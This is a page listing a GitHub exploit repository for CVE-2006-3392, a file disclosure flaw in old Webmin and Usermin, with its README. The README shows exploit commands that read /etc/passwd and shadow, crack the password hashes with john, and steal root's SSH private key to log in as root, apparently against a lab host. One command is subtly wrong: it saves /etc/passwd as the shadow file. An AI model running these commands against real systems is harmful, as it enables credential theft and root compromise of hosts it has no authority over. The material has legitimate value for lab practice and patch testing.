# CVE-2006-3392

Webmin < 1.290 / Usermin < 1.220 - Arbitrary file disclosure

| Infos    | Value                                                              |
| -------- | -------------------------------------------------------------------|
| Username | [https://github.com/g1vi](https://github.com/g1vi) |
| Url      | [https://github.com/g1vi/CVE-2006-3392](https://github.com/g1vi/CVE-2006-3392)                                               |
| Stars    | 1                                                          |
| License  | No License                                                        |

<details>

<summary>Topic / Tags</summary>



</details>

## Readme

# CVE-2006-3392

https://www.cvedetails.com/cve/CVE-2006-3392/

Webmin before 1.290 and Usermin before 1.220 calls the simplify_path function before decoding HTML, which allows remote attackers to read arbitrary files, as demonstrated using "..%01" sequences, which bypass the removal of "../" sequences before bytes such as "%01" are removed from the filename. NOTE: This is a different issue than CVE-2006-3274.

### Usage
Browse any file in the filesystem with root privilege
```
./exploit.sh <target ip> <target port> <file to disclose>
```

### Examples
Browse passwd and shadow on 10.10.11.105, unshadow and crack the hashes
```
./exploit.sh 10.10.11.105 10000 /etc/passwd > passwd
./exploit.sh 10.10.11.105 10000 /etc/passwd > shadow
unshadow passwd shadow > unshadowed
john --wordlist=<your fave wordlist here> unshadowed
```
Browse private rsa key on 10.10.11.105
```
./exploit.sh 10.10.11.105 10000 /root/.ssh/id_rsa > private_key
ssh -i private_key root@10.10.11.105
```

### License
Feel free to use or modify whenever and wherever you like



## Get the content

```
git clone https://github.com/g1vi/CVE-2006-3392
cd CVE-2006-3392
```

{% embed url="https://github.com/g1vi/CVE-2006-3392" %}

<figure><img src="https://avatars.githubusercontent.com/u/120142960?v=4" alt=""><figcaption><p>g1vi</p></figcaption></figure>
